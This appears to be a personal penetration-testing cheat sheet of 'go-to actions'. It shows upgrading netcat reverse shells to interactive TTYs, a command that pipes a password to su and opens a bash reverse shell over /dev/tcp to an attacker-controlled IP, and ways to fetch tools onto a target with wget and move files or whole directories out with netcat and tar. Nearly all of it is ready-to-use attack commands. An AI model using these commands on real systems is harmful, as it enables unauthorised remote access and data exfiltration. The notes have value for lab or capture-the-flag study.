# common go-to actions


## shells

### spawning shells

**python**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

**bash**

**perl**

#### making them full interactive

**shortcut**:
```
/usr/bin/script -qc /bin/bash /dev/null
```

when getting a reverse shell through `netcat`, by default it's non-interactive - meaning it's a pain. once you run any of the above scripts to get a partially interactive shell, you can do a few more things to optimize:

_non-interactive shell_:
```
## get partially interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

_remote shell_:
```
## background process netcat in the remote shell
user@remote:$ ^Z
```
_local env_:
```
## get rows/cols values from your current env
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

## so you can pass keyboard shortcuts, bring netcat back to the foreground 
user@local:~$ stty raw -echo; fg
```
<small>**[ZSH NOTE]**: zsh, specifically, only respects the -echo until the next prompt which means that you need to type your next command all in one line</small>

_remote env_:
```
## set the correct sizes for the remote shell
user@remote:~$ stty rows [ROWS] cols [COLS]

## export shell to ENV
export SHELL=/bin/bash

## enable colors
user@remote:~$ export TERM=xterm-256color

## reload shell to apply the TERM variable
user@remote:~$ reset 
OR
user@remote:~$ exec /bin/bash
```

#### spawn workarounds

_for non-responsive shell spawning when you need to change users_

first start a listening on your local host machine:

```
nc -nlvp [PORT]
```

then, from the remote/target machine:

```
echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
```

## file transfers

**METHOD ONE (`local server & wget`)**:

**usecase**: fetch files/scripts from your local machine on the remote host

_sender_:
```
cd souce_directory
python -m http.server 
```

_'receiver' (more accurately, a fetcher here)_:
```
## python http server always starts by default at port 8000
## unless otherwise specified
wget http://[LOCAL IP]:8000/[FILE YOU WANT]
```

**METHOD TWO (netcat)**:

##### SENDING FILE(S) BETWEEN SYSTEMS

_receiver_:

start a listener and provide the name you want to give the sent file

```
nc -l -p [PORT] > [FILENAME]
```

_sender_:
```
nc -w 3 [RECEIVER IP] [PORT] < [FILENAME]
```

##### SENDING WHOLE DIRECTORIES

_receiver_:

maybe first create a separate directory if you want one, since this is going to send multiple files, then `cd` into it and start a `netcat` listener

```
nc -l -p [PORT] | tar xf -
```

_sender_:

```
cd source_directory
tar cf - . | nc [RECEIVER IP] [PORT]
```